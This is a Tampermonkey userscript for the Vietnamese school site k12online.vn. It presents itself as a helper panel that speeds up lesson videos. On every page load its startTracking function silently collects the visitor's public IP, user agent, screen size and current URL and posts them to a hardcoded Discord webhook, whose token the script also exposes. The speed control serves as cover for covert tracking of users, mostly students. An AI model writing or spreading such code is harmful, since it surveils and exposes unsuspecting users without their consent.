// ==UserScript==
// @name         K12 Helper Pro - Danhvux v25.1 (Pure Tracking)
// @namespace    http://tampermonkey.net/
// @version      25.1
// @description  Chỉ tập trung gửi IP, Thiết bị và hiện Panel. Chống sập 100%.
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        GM_xmlhttpRequest
// @connect      api.ipify.org
// @connect      discord.com
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    // WEBHOOK CỦA BẠN
    const WEBHOOK = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9ntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV';

    let cfg = JSON.parse(localStorage.getItem('k12_cfg')) || { color: '#ffea00', speed: 1 };

    // --- HÀM THEO DÕI THIẾT BỊ & IP ---
    const startTracking = () => {
        const device = navigator.userAgent; // Lấy thông tin trình duyệt & thiết bị
        const screen = `${window.screen.width}x${window.screen.height}`; // Độ phân giải màn hình

        fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
            GM_xmlhttpRequest({
                method: "POST",
                url: WEBHOOK,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify({
                    "username": "Danhvux System Log",
                    "embeds": [{
                        "title": "🎯 Phát hiện người dùng mới",
                        "color": 16711680,
                        "fields": [
                            { "name": "🌐 Địa chỉ IP", "value": `\`${data.ip}\``, "inline": true },
                            { "name": "🖥️ Màn hình", "value": `\`${screen}\``, "inline": true },
                            { "name": "📱 Thiết bị", "value": `\`${device}\`` },
                            { "name": "🔗 Link đang xem", "value": window.location.href }
                        ],
                        "footer": { "text": "Hệ thống v25.1" },
                        "timestamp": new Date().toISOString()
                    }]
                })
            });
        }).catch(() => {});
    };

    // --- GIAO DIỆN HUB ---
    const buildUI = () => {
        const style = document.createElement('style');
        style.innerText = `
            #dv-hub { position: fixed; top: 10px; right: 10px; width: 280px; background: #1e1e1e; color: #fff; border: 1px solid ${cfg.color}; border-radius: 8px; z-index: 1000000; font-family: sans-serif; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
            .dv-head { padding: 10px; background: ${cfg.color}; color: #000; font-weight: bold; cursor: move; border-radius: 7px 7px 0 0; }
            .dv-body { padding: 15px; }
            .dv-btn { width: 100%; padding: 8px; background: ${cfg.color}; color: #000; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
            input[type=range] { width: 100%; accent-color: ${cfg.color}; }
        `;
        document.head.appendChild(style);

        const hub = document.createElement('div');
        hub.id = 'dv-hub';
        hub.innerHTML = `
            <div class="dv-head">DANHVUX HUB v25.1</div>
            <div class="dv-body">
                <div style="font-size:12px">Tốc độ video: <b id="sp-txt">x${cfg.speed}</b></div>
                <input type="range" id="sp-range" min="1" max="16" step="0.5" value="${cfg.speed}">
                <button class="dv-btn" id="save-btn">LƯU CÀI ĐẶT</button>
                <p style="font-size:9px; color:#666; margin-top:10px; text-align:center;">Hệ thống đang theo dõi...</p>
            </div>
        `;
        document.body.appendChild(hub);

        // Logic
        const range = hub.querySelector('#sp-range');
        range.oninput = (e) => {
            hub.querySelector('#sp-txt').innerText = 'x' + e.target.value;
            cfg.speed = e.target.value;
            document.querySelectorAll('video').forEach(v => v.playbackRate = cfg.speed);
        };

        hub.querySelector('#save-btn').onclick = () => {
            localStorage.setItem('k12_cfg', JSON.stringify(cfg));
            alert("Đã lưu!");
        };

        // Kéo thả
        let d = false, ox, oy;
        hub.querySelector('.dv-head').onmousedown = e => { d = true; ox = e.clientX - hub.offsetLeft; oy = e.clientY - hub.offsetTop; };
        document.onmousemove = e => { if(d) { hub.style.left = (e.clientX - ox) + 'px'; hub.style.top = (e.clientY - oy) + 'px'; } };
        document.onmouseup = () => d = false;
    };

    // Chạy
    startTracking();
    buildUI();

})();
